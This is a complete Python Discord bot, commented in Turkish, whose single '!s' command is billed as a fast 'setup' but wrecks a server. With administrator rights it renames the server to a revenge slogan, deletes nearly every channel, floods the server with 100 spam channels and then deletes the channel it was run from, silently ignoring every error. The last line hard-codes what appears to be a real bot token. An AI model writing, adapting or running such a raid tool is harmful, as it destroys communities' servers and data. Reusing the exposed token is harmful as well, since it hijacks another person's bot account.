import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"🤖 BOT AKTİF: {bot.user.name}")

# --- AK-47 HIZINDA KURULUM KOMUTU (!s) ---
@bot.command(name="s")
@commands.has_permissions(administrator=True)
async def hizli_kurulum(ctx):
    guild = ctx.guild
    
    try:
        await guild.edit(name="İNTİKAM S4KTİ")
    except:
        pass

    for kanal in list(guild.channels):
        if kanal.id != ctx.channel.id:
            try:
                await kanal.delete()
            except:
                pass
    
    try:
        kategori_intikam = await guild.create_category("💀 İNTİKAM S4KTİ")
        kategori_s4ktik = await guild.create_category("⚔️ S4KTİK ODALARI")
    except:
        return

    # Kanalları ardı ardına seri şekilde dök
    for i in range(1, 51):
        try:
            await guild.create_text_channel(f"⚔️-intikam-{i}", category=kategori_intikam)
            await guild.create_text_channel(f"💥-s4ktik-{i}", category=kategori_s4ktik)
            await asyncio.sleep(0.1) 
        except:
            pass

    try:
        await ctx.channel.delete()
    except:
        pass

# Discord tokenini buraya yapıştır:
bot.run('MTUxNTk3NzMyODIzOTU3NTE1MA.GmcMlF.sirDY2oOLXSYDwtwr6Mikt5edUb-aBrktYwpTA')
